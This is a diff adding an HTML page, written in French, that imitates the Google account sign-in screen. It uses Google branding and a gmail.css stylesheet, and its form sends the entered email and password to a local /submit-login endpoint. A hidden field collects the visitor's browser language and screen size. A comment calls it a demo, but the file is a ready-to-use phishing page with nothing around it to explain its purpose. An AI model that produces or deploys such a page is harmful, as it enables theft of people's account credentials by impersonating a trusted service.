@@ -1,0 +1,38 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Connexion</title>
+  <link rel="stylesheet" href="/static/css/gmail.css">
+</head>
+<body class="login-bg">
+  <div class="login-card">
+    <div class="login-logo">Google</div>
+    <h1>Connexion</h1>
+    <p class="muted">Utilisez votre compte Google</p>
+
+    <form method="POST" action="/submit-login" id="loginForm">
+      <label>Email ou téléphone</label>
+      <input name="email" autocomplete="username" required placeholder="ex: user@gmail.com"/>
+
+      <label>Mot de passe</label>
+      <input name="password" type="password" autocomplete="current-password" required placeholder="••••••••"/>
+
+      <input type="hidden" name="client_hint" id="clientHint" value="">
+
+      <div class="row space">
+        <button type="button" class="btn-ghost">Créer un compte</button>
+        <button class="btn primary" type="submit">Suivant</button>
+      </div>
+
+    </form>
+  </div>
+
+  <script>
+    // client hints for the demo (non-sensitive)
+    document.getElementById("clientHint").value =
+      `${navigator.language} | ${screen.width}x${screen.height}`;
+  </script>
+</body>
+</html>
